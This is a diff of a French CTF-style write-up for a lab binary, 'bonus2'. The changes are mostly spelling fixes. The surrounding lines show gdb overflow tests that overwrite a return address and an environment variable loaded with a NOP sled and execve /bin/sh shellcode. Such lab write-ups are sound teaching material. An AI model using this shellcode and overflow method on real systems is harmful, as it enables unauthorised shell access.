@@ -1,6 +1,6 @@
-# Bonus1
+# Bonus2
 
-On observe un exécutable à la racine : `bonus2`
+On observe un exécutable à la racine : `bonus1`
 
 ```shell
 $ ./bonus2
@@ -152,7 +152,7 @@ Dump of assembler code for function greetuser:
 End of assembler dump.
 ```
 
-On va utiliser `Cutter` pour avoir un idee plus clair de `bonus2`
+On va utiliser `Cutter` pour avoir une idée plus claire de `bonus2`
 
 ```shell
 $ scp -P 4242 -r bonus2@192.168.56.102:/home/user/bonus2/bonus2 .
@@ -164,7 +164,7 @@ _résultat sauvegardé dans [source.md](source.md)_
 
 On peut voir qu'il utilise une variable d'environnement `LANG` qu'il compare a `0`, `1` et `2`
 
-On va chercher ou et pourquoi il y a un `SEG Fault` avec nos parametre
+On va chercher ou et pourquoi il y a un `SEGFault` avec nos parametre
 
 ```shell
 (gdb) run $(python -c 'print("A"*40)') $(python -c 'print("B"*100)')
@@ -175,7 +175,7 @@ Program received signal SIGSEGV, Segmentation fault.
 0x08004242 in ?? ()
 ```
 
-On peut observer que le second parametre reecrit par dessus `2 octets` du retour de `main`
+On peut observer que le second paramètre réecrit par dessus `2 octets` du retour de `main`
 
 On essaye en changeant la variable denvironnement `LANG`.
 Pour cela nous regardons deux ligne et leur valeur grace a `gdb`
@@ -212,7 +212,7 @@ Program received signal SIGSEGV, Segmentation fault.
 0x08040042 in ?? ()
 ```
 
-On ajoute le notre shellcode dans une variable denvironnement puis on regard son adresse
+On ajoute notre shellcode dans une variable d'environnement puis on regarde son adresse
 
 ```shell
 $ export Shellcode=$(python -c 'print "\x90"*100 +"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe1\x50\x89\xe2\xb0\x0b\xcd\x80"')
